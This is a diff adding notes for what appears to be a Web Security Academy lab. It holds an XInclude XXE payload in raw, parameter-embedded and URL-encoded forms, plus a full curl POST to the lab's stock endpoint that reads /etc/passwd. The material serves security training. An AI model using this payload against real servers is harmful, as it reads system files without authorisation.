@@ -1,0 +1,18 @@
+
+productId=7&storeId=2
+
+
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+
+productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=2
+
+
+productId=<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>&storeId=2
+
+
+curl -i -s -k -X $'POST' \
+    -H $'Host: 0aee00c904651de280b9adc3007f002c.web-security-academy.net' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://0aee00c904651de280b9adc3007f002c.web-security-academy.net/product?productId=7' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 140' -H $'Origin: https://0aee00c904651de280b9adc3007f002c.web-security-academy.net' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Gpc: 1' -H $'Te: trailers' \
+    -b $'session=Gny51KBdrWYqWdmbk9d8Wu8sUbNp8clC' \
+    --data-binary $'productId=<foo+xmlns%3axi%3d\"http%3a//www.w3.org/2001/XInclude\"><xi%3ainclude+parse%3d\"text\"+href%3d\"file%3a///etc/passwd\"/></foo>&storeId=2' \
+    $'https://0aee00c904651de280b9adc3007f002c.web-security-academy.net/product/stock'
